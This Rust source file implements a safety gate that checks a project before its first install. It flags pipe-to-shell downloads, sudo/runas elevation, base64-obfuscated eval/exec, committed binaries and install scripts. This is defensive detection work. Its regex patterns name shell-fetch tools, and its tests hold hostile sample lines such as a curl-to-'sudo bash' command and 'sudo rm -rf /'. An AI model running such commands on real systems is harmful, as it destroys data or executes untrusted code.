//! The safety gate shown before a project's first install (DECISIONS D-006): a plain-language
//! summary of what will happen, plus risk signals. Red signals need typed confirmation; yellow
//! ones are shown prominently. The engine reports codes and parameters; the UI owns the words.
//!
//! These are heuristics. They catch common dangerous patterns, not a determined attacker;
//! docs/SECURITY.md says so plainly.

use crate::detect::FileTree;
use crate::recipe::{AppKind, PackageManager, Recipe, RecipeSource, Step};
use crate::store::Project;
use serde::Serialize;
use std::collections::{BTreeMap, BTreeSet};
use std::sync::LazyLock;

const NEW_DAYS: i64 = 30;
const FEW_STARS: u64 = 10;
const MAX_SCANNED_FILES: usize = 600;
const LONG_BLOB: usize = 300;

#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, PartialOrd, Ord)]
#[serde(rename_all = "camelCase")]
pub enum RiskLevel {
    Red,
    Yellow,
}

#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, PartialOrd, Ord)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum SignalCode {
    /// Downloads a script from the internet and runs it straight away (`curl … | sh`).
    PipeToShell,
    /// Asks for administrator rights (`sudo`, `runas`).
    Elevation,
    /// Hides what code does (encoded blobs fed to `eval`/`exec`).
    Obfuscated,
    /// Runs a program file that was committed to the repository, not built from source.
    CommittedExecutable,
    /// The install and run plan was suggested by AI, not written by the author.
    AiSuggested,
    NewRepo,
    FewStars,
    NewOwner,
    Archived,
    NoLicense,
    /// The project's own manifests run scripts while installing.
    InstallScripts,
}

impl SignalCode {
    pub fn level(self) -> RiskLevel {
        match self {
            Self::PipeToShell
            | Self::Elevation
            | Self::Obfuscated
            | Self::CommittedExecutable
            | Self::AiSuggested => RiskLevel::Red,
            _ => RiskLevel::Yellow,
        }
    }
}

#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RiskSignal {
    pub level: RiskLevel,
    pub code: SignalCode,
    /// Interpolation values: `file`, `days`, `stars`, `line` (an excerpt, scrubbed).
    pub params: BTreeMap<String, String>,
}

/// One line of "what this will do".
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum SummaryItem {
    #[serde(rename_all = "camelCase")]
    Download {
        private: bool,
    },
    SetUpPython {
        version: String,
    },
    #[serde(rename_all = "camelCase")]
    SetUpNode {
        version: String,
        package_manager: String,
    },
    SetUpGo,
    InstallHelpers {
        from: String,
    },
    #[serde(rename_all = "camelCase")]
    RunSetupCommands {
        count: usize,
    },
    OpenInBrowser,
    RunInConsole,
    OpenWindow,
    UseDocker,
    NeedsProgram {
        name: String,
    },
    NeedsKeys {
        names: Vec<String>,
    },
}

#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SafetyReport {
    pub project_id: String,
    /// What consent is given for (`Recipe::fingerprint`).
    pub fingerprint: String,
    pub summary: Vec<SummaryItem>,
    pub signals: Vec<RiskSignal>,
    /// The exact commands, for the "Show exact commands" disclosure.
    pub commands: Vec<String>,
    pub owner: Option<String>,
    pub trusted_owner: bool,
    /// The user already agreed to exactly this plan (or trusts the owner and nothing is red).
    pub consented: bool,
    /// Red signals: the user must type the project name to continue.
    pub needs_typed_confirmation: bool,
    pub confirm_word: String,
    pub ai_suggested: bool,
}

impl SafetyReport {
    pub fn has_red(&self) -> bool {
        self.signals.iter().any(|s| s.level == RiskLevel::Red)
    }
}

pub struct Input<'a> {
    pub project: &'a Project,
    pub recipe: &'a Recipe,
    pub tree: &'a FileTree,
    pub trusted_owner: bool,
    /// Unix seconds.
    pub now: i64,
}

pub fn assess(i: Input<'_>) -> SafetyReport {
    let fingerprint = i.recipe.fingerprint();
    let mut signals = scan_code(i.tree, i.recipe);
    signals.extend(repo_signals(i.project, i.now));
    if i.recipe.source == RecipeSource::Ai {
        signals.push(signal(SignalCode::AiSuggested, []));
    }
    if let Some(s) = install_scripts(i.tree, i.recipe) {
        signals.push(s);
    }
    signals.sort_by_key(|s| (s.level, s.code));
    signals.dedup_by(|a, b| a.code == b.code);

    let red = signals.iter().any(|s| s.level == RiskLevel::Red);
    let agreed = i.project.consented_fingerprint.as_deref() == Some(fingerprint.as_str());
    SafetyReport {
        project_id: i.project.id.clone(),
        summary: summary(i.project, i.recipe),
        commands: commands(i.recipe),
        owner: i.project.owner.clone(),
        trusted_owner: i.trusted_owner,
        consented: agreed || (i.trusted_owner && !red),
        needs_typed_confirmation: red,
        confirm_word: i
            .project
            .repo
            .clone()
            .unwrap_or_else(|| i.project.name.clone()),
        ai_suggested: i.recipe.source == RecipeSource::Ai,
        signals,
        fingerprint,
    }
}

fn signal<const N: usize>(code: SignalCode, params: [(&str, String); N]) -> RiskSignal {
    RiskSignal {
        level: code.level(),
        code,
        params: params
            .into_iter()
            .map(|(k, v)| (k.to_owned(), crate::redact::scrub_owned(v)))
            .collect(),
    }
}

fn summary(p: &Project, r: &Recipe) -> Vec<SummaryItem> {
    let mut out = vec![SummaryItem::Download {
        private: p.is_private,
    }];
    if let Some(v) = &r.python {
        out.push(SummaryItem::SetUpPython { version: v.clone() });
    }
    if let Some(n) = &r.node {
        let pm = match n.package_manager {
            PackageManager::Npm => "npm",
            PackageManager::Pnpm => "pnpm",
            PackageManager::Yarn => "Yarn",
            PackageManager::Bun => "Bun",
        };
        out.push(SummaryItem::SetUpNode {
            version: n.version.clone(),
            package_manager: pm.into(),
        });
    }
    if r.go {
        out.push(SummaryItem::SetUpGo);
    }
    let mut froms = BTreeSet::new();
    let mut custom = 0;
    for step in r.install.iter().filter(|s| s.applies_here()) {
        match &step.label {
            crate::recipe::StepLabel::InstallHelpers { from } => {
                froms.insert(from.clone());
            }
            crate::recipe::StepLabel::Custom { .. } | crate::recipe::StepLabel::BuildProject => {
                custom += 1
            }
            _ => {}
        }
    }
    out.extend(
        froms
            .into_iter()
            .map(|from| SummaryItem::InstallHelpers { from }),
    );
    if custom > 0 {
        out.push(SummaryItem::RunSetupCommands { count: custom });
    }
    for tool in &r.system_tools {
        out.push(if tool == "docker" {
            SummaryItem::UseDocker
        } else {
            SummaryItem::NeedsProgram { name: tool.clone() }
        });
    }
    let keys: Vec<String> = r.env_vars.iter().map(|e| e.name.clone()).collect();
    if !keys.is_empty() {
        out.push(SummaryItem::NeedsKeys { names: keys });
    }
    out.push(match r.kind {
        AppKind::Web => SummaryItem::OpenInBrowser,
        AppKind::Terminal => SummaryItem::RunInConsole,
        AppKind::Gui => SummaryItem::OpenWindow,
    });
    out
}

fn commands(r: &Recipe) -> Vec<String> {
    let step = |s: &Step| {
        let cwd = if s.cwd == "." {
            String::new()
        } else {
            format!("({}) ", s.cwd)
        };
        format!("{cwd}{}", s.argv.join(" "))
    };
    r.install
        .iter()
        .filter(|s| s.applies_here())
        .map(step)
        .chain([r.run.argv.join(" ")])
        .collect()
}

// --- repository signals --------------------------------------------------------------------

fn repo_signals(p: &Project, now: i64) -> Vec<RiskSignal> {
    let mut out = Vec::new();
    if p.owner.is_none() {
        return out; // a local folder: the user's own files
    }
    let age = |date: &Option<String>| {
        date.as_deref()
            .and_then(parse_iso_date)
            .map(|t| (now - t) / 86_400)
    };
    if let Some(days) = age(&p.repo_created_at).filter(|d| *d < NEW_DAYS) {
        out.push(signal(
            SignalCode::NewRepo,
            [("days", days.max(0).to_string())],
        ));
    }
    if let Some(days) = age(&p.owner_created_at).filter(|d| *d < NEW_DAYS) {
        out.push(signal(
            SignalCode::NewOwner,
            [("days", days.max(0).to_string())],
        ));
    }
    if !p.is_private
        && let Some(stars) = p.stars.filter(|s| *s < FEW_STARS)
    {
        out.push(signal(SignalCode::FewStars, [("stars", stars.to_string())]));
    }
    if p.archived {
        out.push(signal(SignalCode::Archived, []));
    }
    if p.license.is_none() && !p.is_private && p.stars.is_some() {
        out.push(signal(SignalCode::NoLicense, []));
    }
    out
}

/// Parses the date part of an ISO-8601 timestamp (`2026-09-30T12:00:00Z`) to Unix seconds.
pub fn parse_iso_date(s: &str) -> Option<i64> {
    let date = s.get(..10)?;
    let mut parts = date.split('-');
    let y: i64 = parts.next()?.parse().ok()?;
    let m: i64 = parts.next()?.parse().ok()?;
    let d: i64 = parts.next()?.parse().ok()?;
    if !(1..=12).contains(&m) || !(1..=31).contains(&d) {
        return None;
    }
    // Days from civil (Howard Hinnant's algorithm).
    let y = if m <= 2 { y - 1 } else { y };
    let era = y.div_euclid(400);
    let yoe = y - era * 400;
    let mp = (m + 9) % 12;
    let doy = (153 * mp + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    Some((era * 146_097 + doe - 719_468) * 86_400)
}

// --- code signals --------------------------------------------------------------------------

static PIPE_TO_SHELL: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(concat!(
        r"(?i)(?:\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b",
        r"|\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?python[0-9.]*\b",
        r"|(?:ba)?sh\s+(?:-c\s+)?[<(\x22']*\$?\(\s*(?:curl|wget)\b",
        r"|\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|\n]*\|\s*(?:iex|invoke-expression)\b",
        r"|\biex\s*\(\s*(?:new-object\s+net\.webclient|iwr|irm|invoke-webrequest))",
    ))
    .expect("pattern")
});

static ELEVATION: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"(?im)(?:^|[\s;&|`(\x22'])(?:sudo|doas|pkexec|gsudo|runas)\s+\S|start-process[^\n]*-verb\s+runas")
        .expect("pattern")
});

static OBFUSCATED: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(concat!(
        r"\b(?:exec|eval)\s*\(\s*(?:__import__\(\s*['\x22](?:base64|zlib|marshal|codecs)['\x22]\s*\)|base64\.|zlib\.|marshal\.|codecs\.decode|bytes\.fromhex|compile\(\s*base64)",
        r"|\b(?:exec|eval)\s*\(\s*(?:atob|Buffer\.from)\s*\(",
        r"|\bmarshal\.loads\s*\(",
        r"|eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e",
        r"|new\s+Function\s*\(\s*(?:atob|Buffer\.from)\s*\(",
    ))
    .expect("pattern")
});

static LONG_BASE64: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(&format!(r"[A-Za-z0-9+/=]{{{LONG_BLOB},}}")).expect("pattern")
});

const SCRIPT_EXTS: &[&str] = &[".sh", ".bash", ".zsh", ".ps1", ".bat", ".cmd", ".command"];
const CODE_EXTS: &[&str] = &[".py", ".js", ".mjs", ".cjs", ".ts"];
const BINARY_EXTS: &[&str] = &[
    ".exe", ".dll", ".so", ".dylib", ".bin", ".msi", ".app", ".jar",
];

/// Files the recipe will run directly, plus the manifests and scripts that run at install.
fn executed_files(tree: &FileTree, r: &Recipe) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    let argvs = r
        .install
        .iter()
        .flat_map(|s| {
            let cwd = s.cwd.clone();
            std::iter::once(s.argv.clone())
                .chain(s.fallbacks.clone())
                .map(move |a| (cwd.clone(), a))
        })
        .chain([(r.run.cwd.clone(), r.run.argv.clone())]);
    for (cwd, argv) in argvs {
        for arg in &argv {
            let rel = arg.trim_start_matches("./").replace('\\', "/");
            for candidate in [rel.clone(), join(&cwd, &rel)] {
                if tree.has(&candidate) {
                    out.insert(candidate);
                }
            }
        }
    }
    for f in ["setup.py", "package.json"] {
        for candidate in [f.to_owned(), join(&r.run.cwd, f)] {
            if tree.has(&candidate) {
                out.insert(candidate);
            }
        }
    }
    out
}

fn join(cwd: &str, rel: &str) -> String {
    if cwd == "." || cwd.is_empty() {
        rel.to_owned()
    } else {
        format!("{}/{rel}", cwd.trim_end_matches('/'))
    }
}

fn excerpt(line: &str) -> String {
    let t = line.trim();
    if t.chars().count() > 120 {
        format!("{}…", t.chars().take(120).collect::<String>())
    } else {
        t.to_owned()
    }
}

fn scan_code(tree: &FileTree, r: &Recipe) -> Vec<RiskSignal> {
    let mut out = Vec::new();
    let executed = executed_files(tree, r);

    for file in &executed {
        let lower = file.to_ascii_lowercase();
        if BINARY_EXTS.iter().any(|e| lower.ends_with(e)) || is_binary_executable(tree, file) {
            out.push(signal(
                SignalCode::CommittedExecutable,
                [("file", file.clone())],
            ));
            continue;
        }
        let Some(text) = tree.read(file) else {
            continue;
        };
        // In package.json only the scripts matter.
        let text = if file.ends_with("package.json") {
            package_scripts(&text)
                .into_values()
                .collect::<Vec<_>>()
                .join("\n")
        } else {
            text
        };
        for line in text.lines() {
            if PIPE_TO_SHELL.is_match(line) {
                out.push(signal(
                    SignalCode::PipeToShell,
                    [("file", file.clone()), ("line", excerpt(line))],
                ));
            }
            let comment = line.trim_start().starts_with('#') && !line.starts_with("#!");
            if !comment && ELEVATION.is_match(line) {
                out.push(signal(
                    SignalCode::Elevation,
                    [("file", file.clone()), ("line", excerpt(line))],
                ));
            }
        }
    }

    // Obfuscation anywhere in the project's own code (it can be imported from what runs).
    let code = tree
        .files()
        .filter(|f| {
            let l = f.to_ascii_lowercase();
            (CODE_EXTS.iter().any(|e| l.ends_with(e)) || SCRIPT_EXTS.iter().any(|e| l.ends_with(e)))
                && !l.ends_with(".min.js")
        })
        .take(MAX_SCANNED_FILES)
        .map(str::to_owned)
        .collect::<Vec<_>>();
    for file in code {
        let Some(text) = tree.read(&file) else {
            continue;
        };
        if let Some(line) = text.lines().find(|l| {
            OBFUSCATED.is_match(l)
                || ((l.contains("exec(") || l.contains("eval(")) && LONG_BASE64.is_match(l))
        }) {
            out.push(signal(
                SignalCode::Obfuscated,
                [("file", file.clone()), ("line", excerpt(line))],
            ));
        }
    }
    out
}

fn is_binary_executable(tree: &FileTree, rel: &str) -> bool {
    use std::io::Read;
    let Ok(mut f) = std::fs::File::open(tree.root().join(rel)) else {
        return false;
    };
    let mut magic = [0u8; 4];
    if f.read_exact(&mut magic).is_err() {
        return false;
    }
    matches!(
        magic,
        [0x7f, b'E', b'L', b'F']
            | [0xfe, 0xed, 0xfa, 0xce | 0xcf]
            | [0xce | 0xcf, 0xfa, 0xed, 0xfe]
            | [0xca, 0xfe, 0xba, 0xbe]
    ) || magic[..2] == *b"MZ"
}

fn package_scripts(text: &str) -> BTreeMap<String, String> {
    serde_json::from_str::<serde_json::Value>(text)
        .ok()
        .and_then(|v| v.get("scripts").cloned())
        .and_then(|s| serde_json::from_value(s).ok())
        .unwrap_or_default()
}

/// Install-time scripts in the project's own manifests (dependencies' are not reviewed).
fn install_scripts(tree: &FileTree, r: &Recipe) -> Option<RiskSignal> {
    const LIFECYCLE: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
    if r.node.is_some() {
        for f in ["package.json".to_owned(), join(&r.run.cwd, "package.json")] {
            let scripts = tree
                .read(&f)
                .map(|t| package_scripts(&t))
                .unwrap_or_default();
            if let Some(name) = LIFECYCLE.iter().find(|n| scripts.contains_key(**n)) {
                return Some(signal(
                    SignalCode::InstallScripts,
                    [
                        ("file", f),
                        ("line", excerpt(&format!("{name}: {}", scripts[*name]))),
                    ],
                ));
            }
        }
    }
    let installs_project = r
        .install
        .iter()
        .any(|s| s.argv.iter().any(|a| a == "." || a == "-e"));
    if r.python.is_some() && installs_project && tree.has("setup.py") {
        return Some(signal(
            SignalCode::InstallScripts,
            [("file", "setup.py".to_owned())],
        ));
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::recipe::{RunSpec, StepLabel, WebSpec};
    use crate::store::ProjectStatus;

    fn project() -> Project {
        Project {
            id: "p1".into(),
            source: "github:o/r".into(),
            name: "r".into(),
            description: None,
            owner: Some("o".into()),
            repo: Some("r".into()),
            ref_name: None,
            commit: None,
            subdir: None,
            stars: Some(500),
            license: Some("MIT".into()),
            avatar_url: None,
            is_private: false,
            archived: false,
            repo_created_at: Some("2020-01-01T00:00:00Z".into()),
            owner_created_at: None,
            consented_fingerprint: None,
            keys_reviewed: false,
            start_at_login: false,
            use_system_terminal: false,
            status: ProjectStatus::Added,
            kind: None,
            recipe: None,
            created_at: 0,
            updated_at: 0,
        }
    }

    fn recipe(install: Vec<Vec<&str>>, run: &[&str]) -> Recipe {
        Recipe {
            kind: AppKind::Web,
            source: RecipeSource::Heuristic,
            python: Some("3.12".into()),
            python_fallbacks: Vec::new(),
            node: None,
            go: false,
            install: install
                .into_iter()
                .map(|a| {
                    Step::new(
                        StepLabel::Custom { name: "x".into() },
                        a.into_iter().map(String::from).collect(),
                    )
                })
                .collect(),
            run: RunSpec {
                argv: run.iter().map(|s| s.to_string()).collect(),
                cwd: ".".into(),
                env: Default::default(),
            },
            web: Some(WebSpec {
                preferred_port: 8501,
                path: "/".into(),
                ready_timeout_secs: 60,
                discover: false,
            }),
            env_vars: vec![],
            system_tools: vec![],
        }
    }

    fn tree(files: &[(&str, &[u8])]) -> (tempfile::TempDir, FileTree) {
        let dir = tempfile::tempdir().unwrap();
        for (name, body) in files {
            let p = dir.path().join(name);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        }
        let t = FileTree::scan(dir.path()).unwrap();
        (dir, t)
    }

    const NOW: i64 = 1_791_676_800; // 2026-10-11

    fn codes(r: &SafetyReport) -> Vec<SignalCode> {
        r.signals.iter().map(|s| s.code).collect()
    }

    #[test]
    fn clean_project_has_no_signals_and_a_summary() {
        let (_d, t) = tree(&[("app.py", b"import streamlit")]);
        let r = recipe(
            vec![vec!["uv", "pip", "install", "-r", "requirements.txt"]],
            &["streamlit", "run", "app.py"],
        );
        let p = project();
        let rep = assess(Input {
            project: &p,
            recipe: &r,
            tree: &t,
            trusted_owner: false,
            now: NOW,
        });
        assert!(rep.signals.is_empty(), "{:?}", rep.signals);
        assert!(!rep.consented);
        assert!(!rep.needs_typed_confirmation);
        assert_eq!(
            rep.summary.first(),
            Some(&SummaryItem::Download { private: false })
        );
        assert_eq!(rep.summary.last(), Some(&SummaryItem::OpenInBrowser));
        assert_eq!(rep.commands.last().unwrap(), "streamlit run app.py");
    }

    #[test]
    fn red_signals_in_scripts_the_recipe_runs() {
        let (_d, t) = tree(&[
            (
                "install.sh",
                b"#!/bin/sh\ncurl -fsSL https://example.com/x.sh | sudo bash\n",
            ),
            ("tool.bin", b"\x7fELF\x02\x01"),
            ("lib/x.py", b"exec(base64.b64decode('aGVsbG8='))\n"),
            ("other.sh", b"sudo rm -rf /\n"), // not run by the recipe
        ]);
        let r = recipe(
            vec![vec!["bash", "install.sh"], vec!["./tool.bin"]],
            &["python", "app.py"],
        );
        let p = project();
        let rep = assess(Input {
            project: &p,
            recipe: &r,
            tree: &t,
            trusted_owner: true,
            now: NOW,
        });
        assert_eq!(
            codes(&rep),
            [
                SignalCode::PipeToShell,
                SignalCode::Elevation,
                SignalCode::Obfuscated,
                SignalCode::CommittedExecutable
            ]
        );
        assert!(rep.needs_typed_confirmation);
        assert!(!rep.consented, "trusting the owner never skips red signals");
        let pipe = &rep.signals[0];
        assert_eq!(pipe.params["file"], "install.sh");
    }

    #[test]
    fn yellow_signals_from_repo_facts_and_trusted_owner_skip() {
        let (_d, t) = tree(&[(
            "package.json",
            br#"{"scripts":{"postinstall":"node fix.js","dev":"vite"}}"# as &[u8],
        )]);
        let mut r = recipe(vec![vec!["npm", "install"]], &["vite"]);
        r.python = None;
        r.node = Some(crate::recipe::NodeSpec {
            version: "24".into(),
            package_manager: PackageManager::Npm,
            package_manager_version: None,
        });
        let mut p = project();
        p.stars = Some(2);
        p.license = None;
        p.archived = true;
        p.repo_created_at = Some("2026-10-01T10:00:00Z".into());
        let rep = assess(Input {
            project: &p,
            recipe: &r,
            tree: &t,
            trusted_owner: false,
            now: NOW,
        });
        assert_eq!(
            codes(&rep),
            [
                SignalCode::NewRepo,
                SignalCode::FewStars,
                SignalCode::Archived,
                SignalCode::NoLicense,
                SignalCode::InstallScripts
            ]
        );
        assert_eq!(rep.signals[0].params["days"], "10");
        assert!(!rep.needs_typed_confirmation);
        let trusted = assess(Input {
            project: &p,
            recipe: &r,
            tree: &t,
            trusted_owner: true,
            now: NOW,
        });
        assert!(trusted.consented, "trusted owner, nothing red: no gate");
    }

    #[test]
    fn consent_matches_the_fingerprint_and_ai_is_red() {
        let (_d, t) = tree(&[("a.py", b"print(1)")]);
        let mut r = recipe(vec![], &["python", "a.py"]);
        let mut p = project();
        p.consented_fingerprint = Some(r.fingerprint());
        assert!(
            assess(Input {
                project: &p,
                recipe: &r,
                tree: &t,
                trusted_owner: false,
                now: NOW
            })
            .consented
        );
        r.run.argv.push("--changed".into());
        assert!(
            !assess(Input {
                project: &p,
                recipe: &r,
                tree: &t,
                trusted_owner: false,
                now: NOW
            })
            .consented
        );
        r.source = RecipeSource::Ai;
        let rep = assess(Input {
            project: &p,
            recipe: &r,
            tree: &t,
            trusted_owner: true,
            now: NOW,
        });
        assert_eq!(codes(&rep), [SignalCode::AiSuggested]);
        assert!(rep.needs_typed_confirmation && rep.ai_suggested);
    }

    #[test]
    fn iso_dates() {
        assert_eq!(parse_iso_date("1970-01-02T00:00:00Z"), Some(86_400));
        assert_eq!(parse_iso_date("2026-10-11"), Some(NOW));
        assert_eq!(parse_iso_date("garbage"), None);
    }
}
